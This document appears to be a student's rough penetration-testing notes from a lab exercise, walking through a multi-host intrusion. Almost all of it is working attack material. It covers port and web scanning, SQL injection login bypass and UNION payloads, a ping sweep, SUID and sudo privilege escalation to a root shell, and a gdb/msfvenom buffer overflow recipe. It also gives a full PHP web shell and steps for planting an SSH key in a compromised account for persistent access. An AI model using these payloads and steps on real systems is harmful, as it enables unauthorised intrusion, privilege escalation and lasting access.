start with 1 ip address ;; nmap -Pn -T4 --min-rate 10000000000 <IP> -p20-23,80,8080 
navigate to website, surf site and look for links (if theres a WALL OF TEXT theres probably something in there) 
nikto -h <webiste IP> 
run nmap -Pn -T5 -sT -p 80 --script http-enum.nse <ip>
sign in page >> sql injection 
    >>username: 'or 1='1 
    >>password: 'or 1='1
go to network tab and peep the post request, copy and paste into the url bar after a "?". veiw page source and you should see creds
log into machine cat out /etc/hosts, sudo -l, ip neigh, for i in i script...

prive esc:
sudo -l, 
find / -type file -perm /4000 2>/dev/null (GTFO bins)
which gdb

no escalation was foudn on this box fuck 

find next jump and run scans for http,ssh,vuln...

exploit vuln http ports on current (2nd) machine 
sql injection:
see radio buttons which lead to a table/chart
no post request so edit url "selection" or "catagory" integers/strings to find an exploitable sql table 
  >>pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
                     ^ edit this selection until smth pops up
  >>pick.php?product=7 UNION SELECT 1,2,3 (on test it will be up and down in a single column not in the rows)
  >>UNION SELECT x,y,z from leftcolumn.rightcolumn
  find creds through tables and columns 
  use creds to crack (or not crack) into machine;; if creds dont work, move on 
  use for i in {1..254} ;do (ping -c 1 192.168.1.$i 2>/dev/null | grep "bytes from" &) ;done    to find reliable connections or next jumps 
  
  use previous creds to crack into the thrid target
  priv esc:
  sudo -l 
  which gdb 
  find / -type file perm /4000 2>/dev/null (GTFO bins)
  sudo find . -exec /bin/sh \; -quit 
  
  
  find next jump;;
widnows!!!!
port 3389,9999
if 9999 is open, netcat for secure server 
buffer overflow::::
--linux--
virfy the program is buffer over flowable 
    enter a loooooong string 
    gbd func (func = program name)
    pdisass main
    pdisass getuserinput >> look for RED text 

create python script for function 
    gdb
    run <<< $(python2 buffover.py)
    copy EIP hex from output
    paste EIP into https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to find offset
    
    env - gbd 
    file func (func = program name)
    unset env LINES
    unset env COLUMNS
    show env 
    run 
    *overflow program with strings* looking for the EIP seg fault
    info proc map 
    *look for first one after [heap]*
    *look for value right above [stack]*
    find /b [head], [stack], 0xff, 0xe4
    copy and paste random segment from output into script + nop sled 
    create payload msfvenom "msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python"
    when youre ready to test it, run the program (not in gdb) 
    ./func <<< $(python2 buffover2.py) 
    should return output of command in payload
success!!
    copy and paste/ scp to target machine
    get the targets EIP through info proc mapand paste it into the script to run 
    
     
     web injection 
     <HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>
    
    
  SSH Key Setup
Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for 
password as well
 ssh-keygen -t rsa
After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension
 cat ~/.ssh/id_rsa.pub
The entire output is your public key, make sure when uploading you copy everything
Uploading SSH Key
On the target website we need to do some tasks in order to upload our ssh properly. These commands can be ran from a place where 
command injection is possible or if you uploaded some malicious php they can be done from there
The following process is done on target through command injection or malicious upload.
Find out what account is running the web sever/commands.
 whoami
Once the user is known find this users home folder by looking in /etc/passwd. We also want to make sure the user has a login shell. 
For the demo we looked for www-data in passwd because they were the resluting user from the previous whoami command.
 www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.
Check to see if .ssh folder is in the users home directory. If not make it
 ls -la /users/home/directory      #check if .ssh exists
 mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
Echo ssh key to the authorized_keys file in the users .ssh folder.
 echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
Verify key has been uploaded successfully.
 cat /users/home/directory/.ssh/authorized_keys  
    
    
    
    
    
    
